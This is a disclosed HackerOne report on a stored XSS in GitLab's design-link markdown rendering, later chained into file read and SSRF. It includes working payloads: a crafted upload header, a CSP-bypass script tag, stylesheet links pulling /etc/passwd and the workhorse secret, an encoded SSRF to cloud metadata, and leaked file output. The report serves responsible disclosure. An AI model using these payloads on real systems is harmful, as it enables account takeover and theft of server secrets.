---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/cross-site-scripting-xss-stored
  - env/web
  - stack/gitlab
  - vuln/xss-stored
  - vuln/xss
  - fix/csp
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2021-10-18
submitted: 2021-05-28T14:42:01.389Z
bounty_usd: 16000
votes: 318
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "vakzz"
source: "https://hackerone.com/reports/1212067"
title: "Stored XSS in markdown via the DesignReferenceFilter "
---
# Stored XSS in markdown via the DesignReferenceFilter 

> **Severity:** Critical | **Bounty:** 16,000 USD | **Votes:** 318 | **Program:** GitLab | **Disclosed:** 2021-10-18

- Report: [https://hackerone.com/reports/1212067](https://hackerone.com/reports/1212067)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2021-05-28T14:42:01.389Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

### Summary
When rendering markdown, links to designs are parsed using the following `link_reference_pattern`:

https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/app/models/design_management/design.rb#L168
```ruby
    def self.link_reference_pattern
      @link_reference_pattern ||= begin
        path_segment = %r{issues/#{Gitlab::Regex.issue}/designs}
        ext = Regexp.new(Regexp.union(SAFE_IMAGE_EXT + DANGEROUS_IMAGE_EXT).source, Regexp::IGNORECASE)
        valid_char = %r{[^/\s]} # any char that is not a forward slash or whitespace
        filename_pattern = %r{
          (?<url_filename> #{valid_char}+ \. #{ext})
        }x

        super(path_segment, filename_pattern)
      end
    end
```

The `url_filename` match is then used in `parse_symbol`:
https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/lib/banzai/filter/references/design_reference_filter.rb#L75
```ruby
def parse_symbol(raw, match_data)
  filename = match_data[:url_filename]
  iid = match_data[:issue].to_i
  Identifier.new(filename: CGI.unescape(filename), issue_iid: iid)
end
```

Since `valid_char` is anything apart from a forward slash or whitespace, this allows for any other special characters (such as quotes) to be matched.

The final `url` match gets used when creating the link in `object_link_filter`:

https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/lib/banzai/filter/references/abstract_reference_filter.rb#L219
```ruby
url =
  if matches.names.include?("url") && matches[:url]
    matches[:url]
  else
    url_for_object_cached(object, parent)
  end

content = link_content || object_link_text(object, matches)

link = %(<a href="#{url}" #{data}
            title="#{escape_once(title)}"
            class="#{klass}">#{content}</a>)
```

So if a design could be uploaded with a double quote in it's filename, this would cause it to break out of the href attribute.

Normally file uploads would go through workhorse and end up being sanitized by CarrierWave::SanitizedFile, but it's possible when uploading a design to skip the workhorse by using a `Content-Disposition` header such as `Content-Disposition: form-data; name="1"; filename*=ASCII-8BIT''filename.png` which allows for any character to be used as part of the design filename.

Since whitespaces and slashes are still invalid, it's only possible to inject tags without attributes, or inject attributed into the `a` element. 

Injecting attributes can be chained with the `ReferenceRedactor` to replace the node with arbitrary html via the `data-original` attribute:

https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/lib/banzai/reference_redactor.rb#L77
```ruby
def redacted_node_content(node)
  original_content = node.attr('data-original')
  link_reference = node.attr('data-link-reference')

  # Build the raw <a> tag just with a link as href and content if
  # it's originally a link pattern. We shouldn't return a plain text href.
  original_link =
    if link_reference == 'true'
      href = node.attr('href')
      content = original_content

      %(<a href="#{href}">#{content}</a>)
    end
```

For a CSP bypass, the jsonp endpoint of the google api can be used in combination with `setTimeout`:
`https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout`

### Steps to reproduce

1. Create a new project on gitlab.com
2. Create a new issue
3. Make sure burp or similar is running
4. Upload a new design
5. Edit the request and change the Content-Disposition header to `Content-Disposition: form-data; name="1"; filename*=ASCII-8BIT''bbb%22class%3D%22gfm%22a%3D%27.png`
6. Refresh the page, there should now be a design named `bbb"class="gfm"a='.png`
7. Create a new issue using the design link and the inner html containing a quote:
```
<a href='https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb%22class%3D%22gfm%22a%3D%27.png'>
' vakzz=here
</a>
```
8. Looking at the markup you can see the `a` attribute contains everything up to the inner html and then the attribute `vakzz` has also been injected:
```html
<a href="https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb" class="gfm" a=".png&quot; data-original=&quot;
' vakzz=here
&quot; data-link=&quot;true&quot; data-link-reference=&quot;true&quot; data-project=&quot;26924211&quot; data-design=&quot;226146&quot; data-issue=&quot;87875440&quot; data-reference-type=&quot;design&quot; data-container=&quot;body&quot; data-placement=&quot;top&quot;
                          title=&quot;bbb&quot;class=&quot;gfm&quot;a='.png&quot;
                          class=&quot;gfm gfm-design has-tooltip&quot;>
" vakzz="here"></a>
```
7. Create a new issue using the design link, this time including the required data attributed to trigger the `ReferenceRedactor` and the payload html encoded in the `data-original`:

```
<a href='https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb%22class%3D%22gfm%22a%3D%27.png'>
' data-design="1" data-issue="1" data-reference-type="design" data-original="
  &lt;script src='https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout'>&lt;/script>
"
</a>
```
8. Save the issue and reload the page

{F1318763}

### Impact
Stored XSS with CSP bypass allowing arbitrary javascript to be run anywhere that markdown could be posted (issues, comments, etc). This could be used to create and exfiltrate api tokens with full access as described in https://hackerone.com/reports/1122227 targeting individuals or specific projects.

### Examples
POC:
https://gitlab.com/vakzz-h1/design-xss/-/issues/3

### What is the current *bug* behavior?
* The `AbstractReferenceFilter` is generating the `link` using string interpolation but the `url` could contain double quotes
* The design model  can have an arbitrary` attribute

### What is the expected *correct* behavior?
* The url should be validated or escaped before being used
* The design model could probably have a validator for the filename

### Relevant logs and/or screenshots

### Output of checks

This bug happens on GitLab.com

## Impact

Stored XSS with CSP bypass allowing arbitrary javascript to be run anywhere that markdown could be posted (issues, comments, etc). This could be used to create and exfiltrate api tokens with full access as described in https://hackerone.com/reports/1122227 targeting individuals or specific projects.

## Timeline

- **Report Filed**
- **2021-05-30** @h1_analyst_oliver: Hi @vakzz,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@princeofpersia
- **Report Pending Program Review**
- **Bounty Awarded**
- **Report Triaged**
- **2021-06-03** @gitlab-securitybot: ETA for fix:

Hi @vakzz,

The issue you reported is currently scheduled to be fixed by 2021-07-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2021-07-02** @vakzz: Hi @rchan,

I've been digging into this a bit more and have found that it can be turned into a limited arbitrary read and ssrf when combined with email notifications.

premailer-rails will try to preload any styles that are present in the html when sending a mail:

https://github.com/fphilipe/premailer-rails/blob/v1.10.3/lib/premailer/rails/customized_premailer.rb#L14
```ruby
        doc = load_html(html)
        options = @options.merge(css_string: CSSHelper.css_for_doc(doc))

        super(doc.to_s, options)
```

https://github.com/fphilipe/premailer-rails/blob/v1.10.3/lib/premailer/rails/css_helper.rb#L26
```ruby
      def css_urls_in_doc(doc)
        doc.search('link[@rel="stylesheet"]:not([@data-premailer="ignore"])').map do |link|
          if link.respond_to?(:remove)
            link.remove
          else
            link.parent.children.delete(link)
          end
          link.attributes['href'].to_s
        end
      end

      def load_css_with_cache(url)
        self.cache[url] ||= load_css(url)
      end

      def cache_enabled?
        defined?(::Rails.env) && ::Rails.env.production?
      end

      def load_css(url)
        Premailer::Rails.config.fetch(:strategies).each do |strategy|
          css = find_strategy(strategy).load(url)
          return css.force_encoding('UTF-8') if css
        end

        raise FileNotFound, %{File with URL "#{url}" could not be loaded by any strategy.}
      end
```

The default strategies are `:filesystem, :asset_pipeline, :network`, so for each `link[@rel="stylesheet"]` found it will try to load the `href` using each of them. The `FileSystemLoader` starts in the rails root public folder but can be traversed out:

https://github.com/fphilipe/premailer-rails/blob/v1.10.3/lib/premailer/rails/css_loaders/file_system_loader.rb#L22
```ruby
        def asset_filename(filename)
          if defined?(::Rails) && ::Rails.respond_to?(:root)
            File.join(::Rails.root, 'public', filename)
          else
            File.join('public', filename)
          end
        end
```

Once each style has been loaded, the are joined with a new line before being sent to premailer.

Premailer is pretty strict for what it will inline, but one option is `backround-image` with can be an arbitrary string. We can use this to leak a line from any file by creating three link tags, the first containing `body { background-image:` the second being the file to leak and the third closing with `;}`. 

```html
<link rel='stylesheet' href='http://aw.rs/css/a'>
<link rel='stylesheet' href='../../../../../../../../../../../etc/passwd'>
<link rel='stylesheet' href='http://aw.rs/css/c'>
```

This will result in the following css, and premailer will choose the last line of the file and inline that as the `background-image`:

```css
body { background-image:
file_content_here

;
}
```

Using the bug in this issue, arbitrary html can be injected into emails such as https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/views/notify/_note_email.html.haml when commenting on an issue.

Injecting the three sheets above results in the last line of `/etc/passwd` being leaked:

```html
<style>img {
max-width: 100%; height: auto;
}
body {
:/usr/sbin/nologingit: x:1000:1000:GitLab,,,:/home/git:/bin/bash;
}
</style>
</head>
<body style=":/usr/sbin/nologingit: x:1000:1000:GitLab,,,:/home/git:/bin/bash;">
<div class="content">

<p style="color: #777777;">
<a href="https://gitlab.com/vakzz-h1">William Bowling</a>
<a href="https://gitlab.com/vakzz-h1/premain/-/issues/1#note_617522002">commented</a>:
</p>
```

Using this the `gitlab_workhorse_secret` can be leaked using `<link rel='stylesheet' href='../.gitlab_workhorse_secret'>`, which I think could then be used to read arbitrary files by faking the jwt (untested at the moment though):

```html
<style>img {
max-width: 100%; height: auto;
}
body {
background-image: yBLqwoBpM81XXXXXXX
}
</style>
```

Cheers,
Will
- **2021-07-02** @vakzz: Using `body[ injected file ] { color: red }` its possible to leak the entire file instead of just the first line:

Payload of:
```html
<link rel='stylesheet' href='http://aw.rs/css/a3?1'>
<link rel='stylesheet' href='../../../../../../../../../../../etc/passwd'>
<link rel='stylesheet' href='http://aw.rs/css/c3?1'>
```

results in:
```html
<style>img {
max-width: 100%; height: auto;
}
body[ root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing list manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats bug-Reporting system (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin git:x:1000:1000:GitLab {
color: red;
}
</style>
```

Cheers,
Will
- **2021-07-03** @vakzz: Looking around at https://gitlab.com/gitlab-org/charts/gitlab/-/tree/master/charts/gitlab/charts/unicorn/templates there are quite a few credentials that could be leaked. The secrets.yml file contains various key_bases and the openid_connect_signing_key, and even though only the start of gitlab.yml can be returned it contains the `object_store` google service account credentials.

An example of the SSRF can be done using pretty much the same payload:

```html
<link rel='stylesheet' href='http://aw.rs/css/a3?1'>
<link rel='stylesheet' href='http://metadata.google.internal/computeMetadata/v1beta1'>
<link rel='stylesheet' href='http://aw.rs/css/c3?1'>
```

When encoded and combined with the initial issue the final payload is:
 
```html
<a href='https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb%22class%3D%22gfm%22a%3D%27.png'>
' data-design="1" data-issue="1" data-reference-type="design" data-original="eeee
&#x3C;&#x6C;&#x69;&#x6E;&#x6B;&#x20;&#x72;&#x65;&#x6C;&#x3D;&#x27;&#x73;&#x74;&#x79;&#x6C;&#x65;&#x73;&#x68;&#x65;&#x65;&#x74;&#x27;&#x20;&#x68;&#x72;&#x65;&#x66;&#x3D;&#x27;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x61;&#x77;&#x2E;&#x72;&#x73;&#x2F;&#x63;&#x73;&#x73;&#x2F;&#x61;&#x33;&#x3F;&#x31;&#x27;&#x3E;&#xA;&#x3C;&#x6C;&#x69;&#x6E;&#x6B;&#x20;&#x72;&#x65;&#x6C;&#x3D;&#x27;&#x73;&#x74;&#x79;&#x6C;&#x65;&#x73;&#x68;&#x65;&#x65;&#x74;&#x27;&#x20;&#x68;&#x72;&#x65;&#x66;&#x3D;&#x27;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6D;&#x65;&#x74;&#x61;&#x64;&#x61;&#x74;&#x61;&#x2E;&#x67;&#x6F;&#x6F;&#x67;&#x6C;&#x65;&#x2E;&#x69;&#x6E;&#x74;&#x65;&#x72;&#x6E;&#x61;&#x6C;&#x2F;&#x63;&#x6F;&#x6D;&#x70;&#x75;&#x74;&#x65;&#x4D;&#x65;&#x74;&#x61;&#x64;&#x61;&#x74;&#x61;&#x2F;&#x76;&#x31;&#x62;&#x65;&#x74;&#x61;&#x31;&#x27;&#x3E;&#xA;&#x3C;&#x6C;&#x69;&#x6E;&#x6B;&#x20;&#x72;&#x65;&#x6C;&#x3D;&#x27;&#x73;&#x74;&#x79;&#x6C;&#x65;&#x73;&#x68;&#x65;&#x65;&#x74;&#x27;&#x20;&#x68;&#x72;&#x65;&#x66;&#x3D;&#x27;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x61;&#x77;&#x2E;&#x72;&#x73;&#x2F;&#x63;&#x73;&#x73;&#x2F;&#x63;&#x33;&#x3F;&#x31;&#x27;&#x3E;
fff
"
</a>
```

Which sends an email with:

```css
body[ missing required header "Metadata-Flavor": "Google" ]
```

Cheers,
Will
- **2021-07-05** @gitlab_cmaxim: Hello @vakzz, 

Thanks for the extra details. At this moment we are having issues reproducing the arbitrary file reads. Would it be posible to help us with the steps (or a screen recording) to trigger it?  

Regards,
Costel 
Gitlab Security Team
- **2021-07-05** @gitlab_cmaxim: Hey @vakzz, 

Please ignore the previous message. We managed to reproduce the issue. 
We will continue to update you via HackerOne as a patch is scheduled for release.

Best regards,
Costel
GitLab Security Team
- **2021-07-06** @vakzz: Hi @gitlab_cmaxim,

Thanks for the update! Sorry the steps to reproduce were a bit rushed, it was pretty late when I was looking at this. Let me know if there's any other clarification or information you need.

On a side note, the `css_parser` gem uses `Kernel.open` in the `read_remote_file` method which seems unnecessarily dangerous (premailer calls `load_uri!` which then calls `read_remote_file`).

https://github.com/premailer/css_parser/blob/v1.7.0/lib/css_parser/parser.rb#L581
```ruby
        if uri.scheme == 'file'
          # local file
          path = uri.path
          path.gsub!(/^\//, '') if Gem.win_platform?
          fh = open(path, 'rb')
          src = fh.read
          charset = fh.respond_to?(:charset) ? fh.charset : 'utf-8'
          fh.close
```

I don't believe it's exploitable though as even though it's possible to perform a redirect from http -> file, luckily the location gets encoded. So for example a redirect with `Location: file:|id` will end up calling `open('%7Cid', 'rb')`.

https://github.com/premailer/css_parser/blob/v1.7.0/lib/css_parser/parser.rb#L604
```ruby
          elsif res.code.to_i >= 300 and res.code.to_i < 400
            if res['Location'] != nil
              return read_remote_file Addressable::URI.parse(Addressable::URI.escape(res['Location']))
            end
          end
```

Cheers,
Will
- **2021-07-20** @gitlab-securitybot: ETA for fix:

Hi @vakzz,

The issue you reported is currently scheduled to be fixed by 2021-08-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2021-09-01** @gitlab-securitybot: ETA for fix:

Hi @vakzz,

The issue you reported is currently scheduled to be fixed by 2021-09-30.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2021-09-01** @vakzz: Thanks @gitlab-securitybot, but looks like it made it into the 14.2.2 release :)

Cheers,
Will
- **Report Severity Updated**
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **2021-10-06** @vakzz: Hi @gitlab_cmaxim,

I was thinking about writing a blog post about this set of issues as it was a rather interesting chain. Probably looking to publish it sometime next week if that's ok? Happy to hold off until https://gitlab.com/gitlab-org/gitlab/-/issues/332420 is made public though if it's still private by then.

Cheers,
Will
- **2021-10-08** @gitlab_cmaxim: Hey @vakzz, 

Thanks for waiting and please let us know when we can read the blog post. I have just changed https://gitlab.com/gitlab-org/gitlab/-/issues/332420 to public. 

Looking forward for your next report.

Best regards,
Costel
GitLab Security Team
- **2021-10-09** @vakzz: Hi @gitlab_cmaxim,

Great thanks! We (perfect blue) are hosting our ctf this weekend, so I'll start writing it after that and let you know :)

Is the other issue (https://gitlab.com/gitlab-org/gitlab/-/issues/335205) and this ticket right be to disclosed as well?

Also in future, would it be better to submit a new h1 report for something like the arbitrary file read even though it depends on the original issue? I don't mind either way, which ever is easier for you.

Cheers,
Will
- **2021-10-11** @gitlab_cmaxim: > Is the other issue (https://gitlab.com/gitlab-org/gitlab/-/issues/335205) and this ticket right be to disclosed as well?

Done.

>Also in future, would it be better to submit a new h1 report for something like the arbitrary file read even though it depends on the original issue? I don't mind either way, which ever is easier for you.

If multiple vulnerabilities are needed to raise the impact, It helps to have all the steps needed to verify the report in one issue.

Thanks,
Costel
- **Cancelled Disclosure Request**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
